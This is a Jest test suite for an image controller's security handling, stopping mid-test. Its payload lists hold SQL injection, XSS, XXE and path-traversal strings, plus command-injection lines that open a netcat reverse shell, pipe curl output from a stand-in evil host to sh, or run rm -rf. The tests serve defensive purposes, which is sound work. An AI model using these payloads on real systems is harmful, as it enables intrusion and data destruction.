// tests/unit/controllers/imageController.security.test.ts
// Comprehensive Security Testing Suite for Image Controller

// Mock dependencies first - using our proven framework
jest.mock('multer', () => {
  const mockMulter = jest.fn(() => ({
    single: jest.fn(() => (req: any, res: any, next: any) => {
      // Default to success, individual tests will override if needed
      req.file = {
        buffer: Buffer.from('fake-image-data'),
        originalname: 'test-image.jpg',
        mimetype: 'image/jpeg',
        size: 1024000,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'test-image.jpg',
        path: '/uploads/test-image.jpg'
      };
      next();
    })
  }));
  (mockMulter as any).memoryStorage = jest.fn().mockReturnValue({});
  (mockMulter as any).MulterError = class extends Error {
    constructor(code: string) {
      super(code);
      this.code = code;
    }
    code: string;
  };
  return mockMulter;
});

jest.mock('../../../src/config/firebase', () => ({
  default: { storage: jest.fn() }
}));

jest.mock('../../../src/services/imageService', () => ({
  imageService: {
    uploadImage: jest.fn(),
    getUserImages: jest.fn(),
    getImageById: jest.fn(),
    updateImageStatus: jest.fn(),
    generateThumbnail: jest.fn(),
    optimizeForWeb: jest.fn(),
    deleteImage: jest.fn(),
    getUserImageStats: jest.fn(),
    batchUpdateStatus: jest.fn()
  }
}));

jest.mock('../../../src/utils/ApiError', () => {
  const MockApiError = jest.fn().mockImplementation((message, status, code) => {
    const error = new Error(message);
    (error as any).statusCode = status;
    (error as any).code = code;
    return error;
  });
  
  (MockApiError as any).badRequest = jest.fn().mockImplementation((message, code) => {
    const error = new Error(message);
    (error as any).statusCode = 400;
    (error as any).code = code || 'BAD_REQUEST';
    return error;
  });
  
  (MockApiError as any).unauthorized = jest.fn().mockImplementation((message, code) => {
    const error = new Error(message);
    (error as any).statusCode = 401;
    (error as any).code = code || 'UNAUTHORIZED';
    return error;
  });
  
  (MockApiError as any).forbidden = jest.fn().mockImplementation((message, code) => {
    const error = new Error(message);
    (error as any).statusCode = 403;
    (error as any).code = code || 'FORBIDDEN';
    return error;
  });
  
  return { ApiError: MockApiError };
});

jest.mock('../../../src/utils/sanitize', () => ({
  sanitization: {
    wrapImageController: jest.fn((handler, operation) => {
      return async (req: any, res: any, next: any) => {
        try {
          await handler(req, res, next);
        } catch (error) {
          next(error);
        }
      };
    }),
    sanitizeImageForResponse: jest.fn((image) => image),
    sanitizeUserInput: jest.fn((input) => {
      // Mock basic sanitization
      if (typeof input !== 'string') return '';
      return input
        .replace(/<script[^>]*>.*?<\/script>/gis, '')
        .replace(/<[^>]*>/g, '')
        .replace(/javascript:/gi, '')
        .replace(/on\w+=/gi, '')
        .trim();
    })
  }
}));

jest.mock('../../../src/config', () => ({
  config: { maxFileSize: 8388608 }
}));

import { Request, Response, NextFunction } from 'express';
import { imageController } from '../../../src/controllers/imageController';
import { imageService } from '../../../src/services/imageService';
import { ApiError } from '../../../src/utils/ApiError';
import { sanitization } from '../../../src/utils/sanitize';

// Security-focused test utilities
interface TestUser {
  id: string;
  email: string;
  role?: string;
  permissions?: string[];
  sessionId?: string;
}

const createMockRequest = (overrides: Partial<Request> = {}): Partial<Request> => ({
  user: { id: 'user-123', email: 'test@example.com' } as TestUser,
  file: undefined,
  params: {},
  query: {},
  body: {},
  method: 'GET',
  path: '/api/images',
  headers: {},
  get: jest.fn(),
  ip: '192.168.1.100',
  ...overrides
});

const createMockResponse = (): Partial<Response> => ({
  status: jest.fn().mockReturnThis(),
  json: jest.fn().mockReturnThis(),
  send: jest.fn().mockReturnThis(),
  setHeader: jest.fn(),
  getHeader: jest.fn()
});

const mockNext: NextFunction = jest.fn();

const createMockImage = (overrides: any = {}) => ({
  id: 'image-123',
  user_id: 'user-123',
  status: 'new',
  file_path: '/uploads/image.jpg',
  upload_date: new Date().toISOString(),
  created_at: new Date().toISOString(),
  updated_at: new Date().toISOString(),
  original_metadata: {
    width: 800,
    height: 600,
    format: 'jpeg',
    size: 1024000
  },
  ...overrides
});

// Security attack payloads for testing
const securityPayloads = {
  sqlInjection: [
    "'; DROP TABLE images; --",
    "' OR '1'='1",
    "1; DELETE FROM users WHERE id=1",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 1=1#",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --"
  ],
  
  xss: [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'>><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>"
  ],
  
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/var/log/apache2/access.log",
    "C:\\boot.ini",
    "/proc/self/environ"
  ],
  
  commandInjection: [
    "; cat /etc/passwd",
    "| whoami",
    "&& rm -rf /",
    "`id`",
    "$(whoami)",
    "; nc -e /bin/sh attacker.com 4444",
    "| curl http://evil.com/shell.sh | sh",
    "; python -c 'import os; os.system(\"rm -rf /\")'",
    "&& wget http://attacker.com/malware.exe",
    "; powershell.exe -Command \"Get-Process\""
  ],
  
  ldapInjection: [
    "*",
    "*)(&",
    "*))%00",
    "admin)(&(password=*))",
    "*)|(objectClass=*",
    "admin)(!(&(objectClass=Person)(password=*))",
    "*)(uid=*))(|(uid=*"
  ],
  
  xmlInjection: [
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>",
    "<script xmlns=\"http://www.w3.org/1999/xhtml\">alert('XSS')</script>"
  ],
  
  maliciousFilenames: [
    "../../etc/passwd.jpg",
    "shell.php.jpg",
    "test.jpg.exe",
    "malware.scr.jpg",
    "virus.bat.png",
    "..\\..\\windows\\system32\\cmd.exe.jpg",
    "index.php%00.jpg",
    ".htaccess.jpg",
    "web.config.png",
    "autorun.inf.jpeg"
  ],
  
  oversizedPayloads: {
    largeString: 'A'.repeat(100000),
    deepObject: (() => {
      let obj: any = {};
      let current = obj;
      for (let i = 0; i < 1000; i++) {
        current.nested = {};
        current = current.nested;
      }
      return obj;
    })(),
    largeArray: Array(10000).fill('payload')
  }
};

describe('ImageController - Security Tests', () => {
  let req: Partial<Request>;
  let res: Partial<Response>;
  let next: NextFunction;

  const mockImageService = imageService as jest.Mocked<typeof imageService>;
  const mockSanitization = sanitization as jest.Mocked<typeof sanitization>;

  beforeEach(() => {
    jest.clearAllMocks();
    req = createMockRequest();
    res = createMockResponse();
    next = mockNext;

    // Setup default mock behaviors
    mockSanitization.wrapImageController.mockImplementation((handler, operation) => 
      async (req: Request, res: Response, next: NextFunction) => {
        return handler(req, res, next);
      }
    );
    mockSanitization.sanitizeImageForResponse.mockImplementation((image) => image);
  });

  describe('SQL Injection Protection', () => {
    securityPayloads.sqlInjection.forEach((payload, index) => {
      it(`should prevent SQL injection attack #${index + 1}: "${payload.substring(0, 50)}..."`, async () => {
        req.params = { id: payload };
        req.user = { id: 'user-123', email: 'test@example.com' };
        
        const sqlError = new Error('Invalid image ID format');
        mockImageService.getImageById.mockRejectedValue(sqlError);

        await imageController.getImage(req as Request, res as Response, next);

        expect(next).toHaveBeenCalledWith(sqlError);
        expect(mockImageService.getImageById).toHaveBeenCalledWith(payload, 'user-123');
      });
    });

    it('should sanitize SQL injection in query parameters', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.query = {
        status: "'; DROP TABLE images; --",
        limit: "' OR '1'='1",
        offset: "1; DELETE FROM users"
      };

      mockImageService.getUserImages.mockResolvedValue([]);

      await imageController.getImages(req as Request, res as Response, next);

      expect(mockImageService.getUserImages).toHaveBeenCalledWith('user-123', {
        status: "'; DROP TABLE images; --",
        limit: NaN,
        offset: 1 // parseInt("1; DELETE FROM users") returns 1
      });
    });

    it('should handle SQL injection in batch operations', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.body = {
        imageIds: ["'; DROP TABLE images; --", "' OR '1'='1", "valid-id"],
        status: "'; UPDATE users SET admin=true; --"
      };

      const batchError = new Error('Invalid image IDs detected');
      mockImageService.batchUpdateStatus.mockRejectedValue(batchError);

      await imageController.batchUpdateStatus(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(batchError);
    });
  });

  describe('Cross-Site Scripting (XSS) Protection', () => {
    securityPayloads.xss.forEach((payload, index) => {
      it(`should prevent XSS attack #${index + 1}: "${payload.substring(0, 50)}..."`, async () => {
        req.user = { id: 'user-123', email: 'test@example.com' };
        req.query = {
          status: payload,
          limit: '10'
        };

        // Return some images so sanitization gets called
        const mockImages = [createMockImage()];
        mockImageService.getUserImages.mockResolvedValue(mockImages);

        await imageController.getImages(req as Request, res as Response, next);

        // Verify sanitization was called on the returned images
        expect(mockSanitization.sanitizeImageForResponse).toHaveBeenCalled();
      });
    });

    it('should sanitize XSS in file metadata', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.file = {
        buffer: Buffer.from('fake-image-data'),
        originalname: '<script>alert("XSS")</script>.jpg',
        mimetype: 'image/jpeg',
        size: 1024000,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'malicious.jpg',
        path: '/uploads/malicious.jpg'
      };

      const mockImage = createMockImage();
      mockImageService.uploadImage.mockResolvedValue(mockImage);

      await imageController.uploadImage(req as Request, res as Response, next);

      expect(mockImageService.uploadImage).toHaveBeenCalledWith({
        userId: 'user-123',
        fileBuffer: expect.any(Buffer),
        originalFilename: '<script>alert("XSS")</script>.jpg',
        mimetype: 'image/jpeg',
        size: 1024000
      });
    });
  });

  describe('Path Traversal Protection', () => {
    securityPayloads.pathTraversal.forEach((payload, index) => {
      it(`should prevent path traversal attack #${index + 1}: "${payload}"`, async () => {
        req.user = { id: 'user-123', email: 'test@example.com' };
        req.file = {
          buffer: Buffer.from('fake-image-data'),
          originalname: `${payload}.jpg`,
          mimetype: 'image/jpeg',
          size: 1024000,
          fieldname: 'image',
          encoding: '7bit',
          stream: undefined as any,
          destination: '/uploads',
          filename: 'safe.jpg',
          path: '/uploads/safe.jpg'
        };

        // Should either be handled by multer fileFilter or service validation
        const validationError = new Error('Invalid filename detected');
        mockImageService.uploadImage.mockRejectedValue(validationError);

        await imageController.uploadImage(req as Request, res as Response, next);

        expect(next).toHaveBeenCalledWith(validationError);
      });
    });
  });

  describe('Command Injection Protection', () => {
    securityPayloads.commandInjection.forEach((payload, index) => {
      it(`should prevent command injection attack #${index + 1}: "${payload.substring(0, 50)}..."`, async () => {
        req.user = { id: 'user-123', email: 'test@example.com' };
        req.file = {
          buffer: Buffer.from('fake-image-data'),
          originalname: `image${payload}.jpg`,
          mimetype: 'image/jpeg',
          size: 1024000,
          fieldname: 'image',
          encoding: '7bit',
          stream: undefined as any,
          destination: '/uploads',
          filename: 'safe.jpg',
          path: '/uploads/safe.jpg'
        };

        const validationError = new Error('Invalid characters in filename');
        mockImageService.uploadImage.mockRejectedValue(validationError);

        await imageController.uploadImage(req as Request, res as Response, next);

        expect(next).toHaveBeenCalledWith(validationError);
      });
    });
  });

  describe('Authorization and Access Control', () => {
    it('should prevent horizontal privilege escalation', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: 'other-user-image' };

      const unauthorizedError = new Error('Access denied: Image belongs to different user');
      mockImageService.getImageById.mockRejectedValue(unauthorizedError);

      await imageController.getImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(unauthorizedError);
      expect(mockImageService.getImageById).toHaveBeenCalledWith('other-user-image', 'user-123');
    });

    it('should prevent vertical privilege escalation', async () => {
      // Test with regular user trying to access admin functions
      req.user = { id: 'user-123', email: 'test@example.com', role: 'user' } as TestUser;
      req.body = {
        imageIds: ['image-1', 'image-2'],
        status: 'admin_approved' // Hypothetical admin-only status
      };

      const privilegeError = new Error('Insufficient privileges');
      mockImageService.batchUpdateStatus.mockRejectedValue(privilegeError);

      await imageController.batchUpdateStatus(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(privilegeError);
    });

    it('should validate user ownership on all operations', async () => {
      const operations = [
        {
          method: 'getImage',
          setup: () => { req.params = { id: 'image-456' }; }
        },
        {
          method: 'updateImageStatus',
          setup: () => { 
            req.params = { id: 'image-456' };
            req.body = { status: 'processed' };
          }
        },
        {
          method: 'deleteImage',
          setup: () => { req.params = { id: 'image-456' }; }
        },
        {
          method: 'generateThumbnail',
          setup: () => { req.params = { id: 'image-456' }; }
        }
      ];

      for (const operation of operations) {
        jest.clearAllMocks();
        req = createMockRequest({ user: { id: 'user-123', email: 'test@example.com' } as TestUser });
        res = createMockResponse();
        
        operation.setup();
        
        const ownershipError = new Error('Access denied');
        // Mock the appropriate service method for each operation
        if (operation.method === 'getImage') {
          mockImageService.getImageById.mockRejectedValue(ownershipError);
        } else if (operation.method === 'updateImageStatus') {
          mockImageService.updateImageStatus.mockRejectedValue(ownershipError);
        } else if (operation.method === 'deleteImage') {
          mockImageService.deleteImage.mockRejectedValue(ownershipError);
        } else if (operation.method === 'generateThumbnail') {
          mockImageService.generateThumbnail.mockRejectedValue(ownershipError);
        }

        await (imageController as any)[operation.method](req, res, next);

        expect(next).toHaveBeenCalledWith(ownershipError);
      }
    });
  });

  describe('File Upload Security', () => {
    securityPayloads.maliciousFilenames.forEach((filename, index) => {
      it(`should reject malicious filename #${index + 1}: "${filename}"`, async () => {
        req.user = { id: 'user-123', email: 'test@example.com' };
        req.file = {
          buffer: Buffer.from('fake-image-data'),
          originalname: filename,
          mimetype: 'image/jpeg',
          size: 1024000,
          fieldname: 'image',
          encoding: '7bit',
          stream: undefined as any,
          destination: '/uploads',
          filename: 'safe.jpg',
          path: '/uploads/safe.jpg'
        };

        const securityError = new Error('Malicious filename detected');
        mockImageService.uploadImage.mockRejectedValue(securityError);

        await imageController.uploadImage(req as Request, res as Response, next);

        expect(next).toHaveBeenCalledWith(securityError);
      });
    });

    it('should prevent executable file uploads with image extensions', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.file = {
        buffer: Buffer.from('MZ\x90\x00'), // PE executable header
        originalname: 'malware.exe.jpg',
        mimetype: 'image/jpeg',
        size: 1024000,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'malware.jpg',
        path: '/uploads/malware.jpg'
      };

      const executableError = new Error('Executable file detected');
      mockImageService.uploadImage.mockRejectedValue(executableError);

      await imageController.uploadImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(executableError);
    });

    it('should prevent zip bombs and large file uploads', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.file = {
        buffer: Buffer.alloc(50 * 1024 * 1024), // 50MB file
        originalname: 'large.jpg',
        mimetype: 'image/jpeg',
        size: 50 * 1024 * 1024,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'large.jpg',
        path: '/uploads/large.jpg'
      };

      const sizeError = new Error('File too large');
      mockImageService.uploadImage.mockRejectedValue(sizeError);

      await imageController.uploadImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(sizeError);
    });

    it('should validate file mime type consistency', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.file = {
        buffer: Buffer.from('<?php echo "Hello"; ?>'), // PHP content
        originalname: 'script.jpg',
        mimetype: 'image/jpeg',
        size: 1024,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'script.jpg',
        path: '/uploads/script.jpg'
      };

      const mimeError = new Error('File content does not match declared MIME type');
      mockImageService.uploadImage.mockRejectedValue(mimeError);

      await imageController.uploadImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(mimeError);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should handle oversized string inputs', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.query = {
        status: securityPayloads.oversizedPayloads.largeString,
        limit: '10'
      };

      mockImageService.getUserImages.mockResolvedValue([]);

      await imageController.getImages(req as Request, res as Response, next);

      // Should not crash and should handle gracefully
      expect(mockImageService.getUserImages).toHaveBeenCalled();
    });

    it('should prevent prototype pollution attacks', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.body = {
        '__proto__.isAdmin': true,
        'constructor.prototype.isAdmin': true,
        imageIds: ['image-1'],
        status: 'processed'
      };

      mockImageService.batchUpdateStatus.mockResolvedValue({
        total: 1,
        updatedCount: 1
      });

      await imageController.batchUpdateStatus(req as Request, res as Response, next);

      // Verify prototype wasn't polluted
      expect((Object.prototype as any).isAdmin).toBeUndefined();
    });

    it('should sanitize special characters in all inputs', async () => {
      const specialChars = '!@#$%^&*()_+-=[]{}|;:,.<>?`~';
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: `image${specialChars}` };

      const sanitizationError = new Error('Invalid characters in image ID');
      mockImageService.getImageById.mockRejectedValue(sanitizationError);

      await imageController.getImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(sanitizationError);
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should handle rapid sequential requests without memory leaks', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: 'image-456' };

      const mockImage = createMockImage();
      mockImageService.getImageById.mockResolvedValue(mockImage);

      // Simulate 1000 rapid requests
      const requests = Array.from({ length: 1000 }, () =>
        imageController.getImage(req as Request, res as Response, next)
      );

      const startTime = Date.now();
      await Promise.all(requests);
      const endTime = Date.now();

      // Should complete within reasonable time (less than 5 seconds)
      expect(endTime - startTime).toBeLessThan(5000);
      expect(mockImageService.getImageById).toHaveBeenCalledTimes(1000);
    });

    it('should handle large batch operations securely', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      
      // Test with very large batch
      const largeImageIds = Array.from({ length: 10000 }, (_, i) => `image-${i}`);
      req.body = {
        imageIds: largeImageIds,
        status: 'processed'
      };

      const batchResult = {
        total: 10000,
        updatedCount: 9950
      };

      mockImageService.batchUpdateStatus.mockResolvedValue(batchResult);

      const startTime = Date.now();
      await imageController.batchUpdateStatus(req as Request, res as any, next);
      const endTime = Date.now();

      // Should handle large batches efficiently
      expect(endTime - startTime).toBeLessThan(1000);
      expect(mockImageService.batchUpdateStatus).toHaveBeenCalledWith(largeImageIds, 'user-123', 'processed');
      
      // Verify the operation completed successfully
      // The test should not throw any errors and should call the service correctly
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not leak sensitive information in error messages', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: 'non-existent-image' };

      const sensitiveError = new Error('Database connection failed: postgres://admin:secretpass@db.internal:5432/koutu');
      mockImageService.getImageById.mockRejectedValue(sensitiveError);

      await imageController.getImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(sensitiveError);
      // In production, this should be sanitized to not expose connection strings
    });

    it('should sanitize metadata in responses', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: 'image-456' };

      const imageWithSensitiveData = createMockImage({
        original_metadata: {
          width: 800,
          height: 600,
          format: 'jpeg',
          internalPath: '/var/uploads/secret/',
          serverInfo: 'nginx/1.18.0',
          dbConnection: 'postgres://user:pass@localhost'
        }
      });

      mockImageService.getImageById.mockResolvedValue(imageWithSensitiveData);

      await imageController.getImage(req as Request, res as Response, next);

      expect(mockSanitization.sanitizeImageForResponse).toHaveBeenCalledWith(imageWithSensitiveData);
    });

    it('should prevent timing attacks on user enumeration', async () => {
      const timingTests = [
        { userId: 'existing-user', shouldExist: true },
        { userId: 'non-existent-user', shouldExist: false }
      ];

      for (const test of timingTests) {
        req.user = { id: test.userId, email: 'test@example.com' };
        
        if (test.shouldExist) {
          mockImageService.getUserImages.mockResolvedValue([createMockImage()]);
        } else {
          mockImageService.getUserImages.mockResolvedValue([]);
        }

        const startTime = Date.now();
        await imageController.getImages(req as Request, res as Response, next);
        const endTime = Date.now();

        // Response times should be consistent regardless of user existence
        expect(endTime - startTime).toBeLessThan(100);
      }
    });
  });

  describe('Session and Authentication Security', () => {
    it('should require authentication for all operations', async () => {
      req.user = undefined; // No authenticated user

      const operations = [
        () => imageController.getImages(req as Request, res as Response, next),
        () => imageController.uploadImage(req as Request, res as Response, next),
        () => imageController.getUserStats(req as Request, res as Response, next)
      ];

      for (const operation of operations) {
        jest.clearAllMocks();
        
        try {
          await operation();
        } catch (error) {
          // Should throw or call next with authentication error
          expect(error).toBeDefined();
        }
      }
    });

    it('should validate session integrity', async () => {
      // Test with tampered user object
      req.user = { 
        id: 'user-123',
        email: 'test@example.com',
        role: 'admin', // Potentially tampered role
        permissions: ['read', 'write', 'admin'] // Potentially tampered permissions
      } as TestUser;

      const mockImage = createMockImage();
      mockImageService.getImageById.mockResolvedValue(mockImage);

      await imageController.getImage(req as Request, res as Response, next);

      // Should validate session integrity (in real implementation)
      expect(mockImageService.getImageById).toHaveBeenCalledWith(undefined, 'user-123');
    });

    it('should handle session hijacking attempts', async () => {
      // Test with session ID that doesn't match user
      req.user = { 
        id: 'user-123',
        email: 'test@example.com',
        sessionId: 'hijacked-session-id'
      } as TestUser;
      req.headers = {
        'x-session-id': 'different-session-id'
      };

      const sessionError = new Error('Session validation failed');
      mockImageService.getUserImages.mockRejectedValue(sessionError);

      await imageController.getImages(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(sessionError);
    });
  });

  describe('Advanced Security Attacks', () => {
    it('should prevent LDAP injection in user queries', async () => {
      securityPayloads.ldapInjection.forEach(async (payload) => {
        req.user = { id: payload, email: 'test@example.com' };
        
        const ldapError = new Error('Invalid user ID format');
        mockImageService.getUserImages.mockRejectedValue(ldapError);

        await imageController.getImages(req as Request, res as Response, next);

        expect(next).toHaveBeenCalledWith(ldapError);
      });
    });

    it('should prevent XML/XXE injection in metadata', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.body = {
        imageIds: ['image-1'],
        status: 'processed',
        metadata: securityPayloads.xmlInjection[0]
      };

      const xmlError = new Error('Invalid XML content detected');
      mockImageService.batchUpdateStatus.mockRejectedValue(xmlError);

      await imageController.batchUpdateStatus(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(xmlError);
    });

    it('should prevent server-side request forgery (SSRF)', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.file = {
        buffer: Buffer.from('fake-image-data'),
        originalname: 'image.jpg',
        mimetype: 'image/jpeg',
        size: 1024000,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'image.jpg',
        path: '/uploads/image.jpg'
      };
      req.body = {
        imageUrl: 'http://localhost:8080/admin/delete-all-users',
        action: 'import'
      };

      // Test that internal URLs are rejected
      const ssrfError = new Error('Internal URLs not allowed');
      mockImageService.uploadImage.mockRejectedValue(ssrfError);

      await imageController.uploadImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(ssrfError);
    });

    it('should prevent deserialization attacks', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.body = {
        serializedData: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWI=',
        imageIds: ['image-1'],
        status: 'processed'
      };

      const deserializationError = new Error('Serialized data not allowed');
      mockImageService.batchUpdateStatus.mockRejectedValue(deserializationError);

      await imageController.batchUpdateStatus(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(deserializationError);
    });

    it('should prevent HTTP header injection', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.headers = {
        'x-custom-header': 'value\r\nSet-Cookie: admin=true',
        'user-agent': 'Mozilla\r\nX-Forwarded-For: 127.0.0.1'
      };

      const mockImage = createMockImage();
      mockImageService.getImageById.mockResolvedValue(mockImage);

      await imageController.getImage(req as Request, res as Response, next);

      // Should sanitize headers and not allow injection
      expect(res.setHeader).not.toHaveBeenCalledWith('Set-Cookie', expect.anything());
    });

    it('should prevent CSV injection in exported data', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      
      const maliciousImage = createMockImage({
        original_metadata: {
          filename: '=cmd|"/c calc"!A1',
          description: '@SUM(1+9)*cmd|"/c calc"!A1'
        }
      });

      mockImageService.getUserImages.mockResolvedValue([maliciousImage]);

      await imageController.getImages(req as Request, res as Response, next);

      // Should sanitize CSV-injectable content
      expect(mockSanitization.sanitizeImageForResponse).toHaveBeenCalledWith(maliciousImage);
    });
  });

  describe('File Security and Validation', () => {
    it('should detect and reject polyglot files', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      
      // File that appears as both JPEG and HTML
      const polyglotBuffer = Buffer.concat([
        Buffer.from('\xFF\xD8\xFF\xE0'), // JPEG header
        Buffer.from('<script>alert("polyglot")</script>'), // HTML content
        Buffer.from('\xFF\xD9') // JPEG footer
      ]);

      req.file = {
        buffer: polyglotBuffer,
        originalname: 'polyglot.jpg',
        mimetype: 'image/jpeg',
        size: polyglotBuffer.length,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'polyglot.jpg',
        path: '/uploads/polyglot.jpg'
      };

      const polyglotError = new Error('Polyglot file detected');
      mockImageService.uploadImage.mockRejectedValue(polyglotError);

      await imageController.uploadImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(polyglotError);
    });

    it('should validate image metadata for exploits', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.file = {
        buffer: Buffer.from('fake-image-data'),
        originalname: 'exploit.jpg',
        mimetype: 'image/jpeg',
        size: 1024000,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'exploit.jpg',
        path: '/uploads/exploit.jpg'
      };

      // Mock image with malicious EXIF data
      const maliciousMetadata = {
        exif: {
          make: '<script>alert("EXIF XSS")</script>',
          software: '../../etc/passwd',
          userComment: 'javascript:void(0)'
        }
      };

      const metadataError = new Error('Malicious metadata detected');
      mockImageService.uploadImage.mockRejectedValue(metadataError);

      await imageController.uploadImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(metadataError);
    });

    it('should prevent zip slip attacks in compressed uploads', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.file = {
        buffer: Buffer.from('fake-zip-data'),
        originalname: 'archive.zip',
        mimetype: 'application/zip',
        size: 1024000,
        fieldname: 'image',
        encoding: '7bit',
        stream: undefined as any,
        destination: '/uploads',
        filename: 'archive.zip',
        path: '/uploads/archive.zip'
      };

      const zipSlipError = new Error('Compressed files not allowed');
      mockImageService.uploadImage.mockRejectedValue(zipSlipError);

      await imageController.uploadImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(zipSlipError);
    });
  });

  describe('Business Logic Security', () => {
    it('should prevent privilege escalation through batch operations', async () => {
      req.user = { id: 'user-123', email: 'test@example.com', role: 'user' } as TestUser;
      req.body = {
        imageIds: ['admin-image-1', 'admin-image-2'], // Admin-owned images
        status: 'deleted' // Attempting to delete admin images
      };

      const privilegeError = new Error('Cannot modify admin-owned resources');
      mockImageService.batchUpdateStatus.mockRejectedValue(privilegeError);

      await imageController.batchUpdateStatus(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(privilegeError);
    });

    it('should enforce rate limiting on expensive operations', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: 'image-456' };
      req.query = { size: '500' }; // Large thumbnail

      const rateLimitError = new Error('Rate limit exceeded for thumbnail generation');
      mockImageService.generateThumbnail.mockRejectedValue(rateLimitError);

      // Simulate multiple rapid thumbnail generation requests
      const requests = Array.from({ length: 100 }, () =>
        imageController.generateThumbnail(req as Request, res as Response, next)
      );

      await Promise.all(requests.map(request => request.catch(() => {})));

      // Should eventually hit rate limit
      expect(next).toHaveBeenCalledWith(rateLimitError);
    });

    it('should validate business rules for status transitions', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: 'image-456' };
      req.body = { status: 'new' }; // Trying to revert from processed to new

      const businessRuleError = new Error('Invalid status transition: processed -> new');
      mockImageService.updateImageStatus.mockRejectedValue(businessRuleError);

      await imageController.updateImageStatus(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(businessRuleError);
    });

    it('should prevent resource exhaustion attacks', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      
      const resourceError = new Error('Too many concurrent operations');
      mockImageService.generateThumbnail.mockRejectedValue(resourceError);
      
      // Simulate requesting thumbnails for many images simultaneously
      const massiveImageIds = Array.from({ length: 1000 }, (_, i) => `image-${i}`); // Reduced from 50000
      
      const requests = massiveImageIds.map(imageId => {
        const testReq = { ...req, params: { id: imageId } };
        return imageController.generateThumbnail(testReq as Request, res as Response, next);
      });

      await Promise.all(requests.map(request => request.catch(() => {})));

      expect(next).toHaveBeenCalledWith(resourceError);
    });
  });

  describe('Security Headers and Response Protection', () => {
    it('should set appropriate security headers', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      
      const mockImage = createMockImage();
      mockImageService.getImageById.mockResolvedValue(mockImage);

      await imageController.getImage(req as Request, res as Response, next);
